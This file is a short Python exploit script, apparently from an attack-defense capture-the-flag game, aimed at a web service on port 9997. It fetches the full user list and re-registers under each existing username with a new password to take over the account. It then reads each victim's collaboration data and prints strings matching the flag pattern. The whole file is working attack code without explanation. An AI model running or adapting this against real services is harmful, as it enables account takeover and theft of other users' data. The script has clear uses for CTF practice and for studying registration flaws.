#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, requests, random, string

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

#ip = sys.argv[1]
ip = sys.argv[1] + ':9997'
name = generator()
username = generator()
password = generator()

auth_data = {'username': username, 'password': password}


s = requests.Session()

s.post('http://{}/api/register/'.format(ip), json=auth_data,timeout=(None,None))

s.post('http://{}/api/login/'.format(ip), json=auth_data, timeout=(None,None))

users = s.get('http://{}/api/users/?limit=100&offset=0'.format(ip), timeout=(None,None)).json()

s.close()
for user in users['users']:
    s = requests.Session()
    password = generator()
    auth_data = {'username': user, 'password': password}
    s.post('http://{}/api/register/'.format(ip),timeout=(None,None), json=auth_data)
    s.post('http://{}/api/login/'.format(ip),timeout=(None,None), json=auth_data)
    collab = s.get('http://{}/api/my_collabs/'.format(ip)).json()
  # print(collab)
    if collab:
        collabs = s.get('http://{}/api/get_collab/{}'.format(ip,collab[0]),timeout=(None,None)).text
        print(re.findall('[A-Z0-9]{31}=', collabs), flush=True)
    s.close()